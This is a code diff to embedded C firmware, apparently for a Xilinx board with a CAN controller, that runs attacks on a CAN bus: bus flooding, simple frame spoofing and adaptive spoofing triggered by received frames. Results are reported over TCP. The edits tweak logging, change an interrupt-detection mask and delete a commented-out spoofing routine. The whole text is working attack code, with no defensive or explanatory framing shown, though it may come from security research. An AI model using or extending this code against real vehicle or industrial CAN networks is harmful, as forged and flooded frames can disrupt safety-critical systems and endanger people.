@@ -65,9 +65,9 @@ Attack_StatusTypeDef startBusFlood(struct netif *netif) {
 	BusFloodMessage = message;
 
 	// Wait for buffer 0, 1, 2 to be clear
+	xil_printf("Waiting to send\r\n");
 	do {
 		status = CAN_ReadStatus(&myDevice);
-		xil_printf("Waiting to send\r\n");
 	} while ((status & CAN_STATUS_TX012REQ_MASK) != 0);
 
 	//Loading Busflood Message in all Buffers
@@ -136,9 +136,9 @@ Attack_StatusTypeDef startSimpleFrameSpoofing(u32 identifier, u8* data, u8 lengt
 	}
 
 	 // Wait for buffer 0 to be clear
+	xil_printf("Waiting to send\r\n");
 	do {
 		status = CAN_ReadStatus(&myDevice);
-		xil_printf("Waiting to send\r\n");
 	} while ((status & CAN_STATUS_TX0REQ_MASK) != 0);
 
 	//Sending Message
@@ -151,6 +151,7 @@ Attack_StatusTypeDef startSimpleFrameSpoofing(u32 identifier, u8* data, u8 lengt
 		status = CAN_ReadStatus(&myDevice);
 	} while ((status & CAN_STATUS_TX0IF_MASK) != 0);
 	xil_printf("Message Send\r\n");
+	xil_printf("Simple Frame Spoofing finished\r\n");
 
 	char message[] = "Simple Frame Spoofing finished";
 	tcp_write(connection, message, sizeof(message), 1);
@@ -208,37 +209,11 @@ Attack_StatusTypeDef startAdaptiveSpoofing(u32 identifier, u8* data, u8 length, 
 
 	//Sending Frame as soon as the Receive Interrupt is generated
 	do {
-		if((Xil_In32(XPAR_PMODCAN_0_AXI_LITE_GPIO_BASEADDR) & 0x4) != 0x4) {
+		if((Xil_In32(XPAR_PMODCAN_0_AXI_LITE_GPIO_BASEADDR) & 0xC) != 0xC) {
 			CAN_RequestToSend(&myDevice, CAN_RTS_TXB0_MASK);
 			finished_flag = 1;
 			xil_printf("Spoofing successfull\r\n");
 		}
-		/*
-		do {
-		   status = CAN_ReadStatus(&myDevice);
-		   //xil_printf("Waiting to receive\r\n");
-		} while ((status & CAN_STATUS_RX0IF_MASK) != 0
-			  && (status & CAN_STATUS_RX1IF_MASK) != 0);
-
-
-		switch ((CAN_ReadStatus(&myDevice)) & 0x03) {
-			case 0b01:
-			case 0b11:	//CAN_Rx0
-				CAN_RequestToSend(&myDevice, CAN_RTS_TXB0_MASK);
-			    finished_flag = 1;
-			    xil_printf("Before, %d\r\n", Xil_In32(XPAR_PMODCAN_0_AXI_LITE_GPIO_BASEADDR));
-			    CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, CAN_CANINTF_RX0IF_MASK, 0);
-			    xil_printf("Spoofing successfull, %d\r\n", Xil_In32(XPAR_PMODCAN_0_AXI_LITE_GPIO_BASEADDR));
-			    break;
-			case 0b10:	//CAN_Rx1
-			    break;
-			default:
-				continue;
-
-		}
-
-		//CAN_ModifyReg(&myDevice, CAN_CANINTF_REG_ADDR, rx_int_mask, 0);
-		 */
 	} while(finished_flag != 1);
 	xil_printf("Spoofing finished\r\n");
 	char message[] = "Adaptive Spoofing finished";
